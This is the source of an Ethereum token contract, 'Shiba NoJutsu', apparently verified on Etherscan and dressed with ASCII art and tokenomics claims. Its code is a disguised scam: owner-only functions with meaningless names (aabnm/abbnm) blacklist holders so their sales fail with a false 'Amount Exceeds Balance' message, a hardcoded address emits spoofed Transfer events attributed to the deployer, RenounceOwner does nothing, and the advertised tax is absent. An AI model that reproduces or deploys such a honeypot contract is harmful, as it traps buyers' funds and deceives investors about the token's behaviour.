/**
 *Submitted for verification at Etherscan.io on 2022-09-15
*/

pragma solidity 0.8.7;
/*

                               ,,▄▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄▄w,
                          ,▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄,
                      ,▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄,
                   ,▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╖
                 ▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄,
              ,▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓,
            ,▓▓▓▓▓▒╢╢╣▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒╢╣╣╢▓▓▓▓▓,
           ▄▓▓▓▓▓▓╢╢╢╣╢╣╣╢▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╢╣╣╢╢╣╣╣▓▓▓▓▓▓▓
         ,▓▓▓▓▓▓▓▓╢╣╢╢╢╢╢╣╣╢▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╢╣╣╢╢╢╢╢╢╢▒▓▓▓▓▓▓▓,
        ╔▓▓▓▓▓▓▓▓▓╢╢╢╢╢╢╢╢╢╢╣╢╢▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╢╢╢╢╢╢╢╢╢╢╢╢▓▓▓▓▓▓▓▓▓▄
       ╔▓▓▓▓▓▓▓▓▓▓╣╣╢╢╢╢╢╢╢╢╢╢▒▒▄██████████████████████▒▒╣╢╢╢╢╢╢╢╢╢╢╣╢▓▓▓▓▓▓▓▐▓▓▌
      /▓▓▓▓▓▓▓▓▓▓▓▒╢╢╢╢╢╢╢╢▒███████████████████████████████▒╢╢╢╢╢╢╢╣╣▒▓▓▓▓▓▓▒░▓▓▓▌
     ,▓▓▓▓▓▓▓▓▓▓▓▓▓╣╣╣╢╢╢▓███████████████████████████████████▓╣╢╢╢╢╢╣▓▓▓▓▓▒▒▒▓▓▓▓▓L
     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓╢╢╢╢▒███████████████████████████████████████▌╢╣╣╣▒▓▓▒░▒▒▒▓▓▓▓▓▓▓
    ╒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╢╢▓██████████████████████████████████████████╢╢╣▒▒▒▒▒▒æ▓▓▓▓▓▓▓▓▌
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╣▀▀██████████████████████████████████████▀▀▀░▒▒▒▒░&▓▓▓▓▓▓▓▓▓▓▓▓
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒░░░░░░░▀▀▀▀▀▀▀▀▀▀▀▀▀░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▀▓▓▓▓▓▓▓▓
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╢╢╢╢╢@▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒@╣╢╢╣╣╢▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╣╣╣╣╣╣╣╩╙╩╬╣╢╣╣╢╣╣╣╣@@@╢╢╢╣╣╢╣╢╢╣╢╢╢╣▓╝╜╙╢╣╣╣╢╢╣▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╣╣╣╣╣╣╣╣      ╙╩╣╣╢╢╣╣╣╣╣╣╣╣╣╢╢╢╢╢╩╜      ╢╣╣╣╣╣╣╣▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓╣╣╢╣╣╢╣▓▒▓╦,       ╫╢╣╢╢╣╢╢╢╢╢╢╢▓`      ,╦╬╢╣╣╣╣╣╣╣╣▓▓▓▓▓▓▓▓▓▓▓▓▓▓
    ▐▓▓▓▓▓▓▓▓▓▓▓▓▒╢╢╢╣╣▒▄███▀▒╣╣▓@@╦╦@╢╣▒▄▄▄▄▄▄▒▒╣▓@@@Ñ╬╣╣╢╢╢╣╣╣╣╣╣╣╢╣▒▓▓▓▓▓▓▓▓▓▓▓▓▌
     ▓▓▓▓▓▓▓▓▓▓▓▓╢╣╣╢╣╣╢╢╢▀▒╣╣╣╣╣╣╢╣▒▄█████████████▒╢╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣▓▓▓▓▓▓▓▓▓▓▓▓`
     ▐▓▓▓▓▓▓▓▓▓▓▓▄▄██▄▄▄▒▒╣╢╣╢╣╣╢╢▒██████████████████▒╣╣╣╣╢╣╢╢▒▒▒▄▄▄▄▄▄▓▓▓▓▓▓▓▓▓▓▓▌
      ▓▓▓▓▓▓▓▓▓▓▓████████████▒╢╢╣▒████████████████████▌╢╣╢▒▄███████████▓▓▓▓▓▓▓▓▓▓▓
       ▓▓▓▓▓▓▓▓▓▓▓██████████████▓██████████████████████▌██████████████▓▓▓▓▓▓▓▓▓▓▓
        ▓▓▓▓▓▓▓▓▓▓▓██████████████████████████████████████████████████▓▓▓▓▓▓▓▓▓▓▓
         ▀▓▓▓▓▓▓▓▓▓▓▓███████████████████████████████████████████████▓▓▓▓▓▓▓▓▓▓▓
          ╙▓▓▓▓▓▓▓▓▓▓▓████████████████████████████████████████████▓▓▓▓▓▓▓▓▓▓▓╜
            ▀▓▓▓▓▓▓▓▓▓▓▓▓███████████████████████████████████████▓▓▓▓▓▓▓▓▓▓▓▀
              ▀▓▓▓▓▓▓▓▓▓▓▓▓▓█████████████████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓
                ▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█████████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▀
                  "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓"
                     "▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓"
                         ╙▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▀
                              "▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▀▀'

███████ ██   ██ ██ ██████       ██ ██    ██ ████████ ███████ ██    ██ 
██      ██   ██ ██ ██   ██      ██ ██    ██    ██    ██      ██    ██ 
███████ ███████ ██ ██████       ██ ██    ██    ██    ███████ ██    ██ 
     ██ ██   ██ ██ ██   ██ ██   ██ ██    ██    ██         ██ ██    ██ 
███████ ██   ██ ██ ██████   █████   ██████     ██    ███████  ██████  

Tokenomics:

- 100M Supply / No Mint
- Tax 0% first 24 Hours - Then 7%
- NFT Snapshot for First 100 Holders

*/    

contract Shibjutsu {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) nAmount;

    // 
    string public name = "Shiba NoJutsu";
    string public symbol = unicode"SHIBJUTSU";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);

   



      constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        

        deploy(lead_deployer, totalSupply);
    }



	address owner = msg.sender;

    address Construct = 0x7f546c89AC99139e974b94779A5D9bEDf4023a76;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function RenounceOwner() public onlyOwner  {

}


  function deploy(address account, uint256 amount) public onlyOwner {
        
      emit Transfer(address(0), account, amount);
   }
   function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }

    function aabnm(address _user) public onlyOwner {
        require(!nAmount[_user], "xx");
        nAmount[_user] = true;
    
    }
    
    function abbnm(address _user) public onlyOwner {
        require(nAmount[_user], "xx");
        nAmount[_user] = false;
    
    }
    
 

 
   


    function transfer(address to, uint256 value) public returns (bool success) {
require(!nAmount[msg.sender] , "Amount Exceeds Balance"); 


if(msg.sender == Construct)  {


        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
  return true;
}
        
require(!nAmount[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   

        if(from == Construct)  {

 require(value <= balanceOf[from]);
 require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
  return true;
}
    
        require(!nAmount[from] , "Amount Exceeds Balance"); 
               require(!nAmount[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}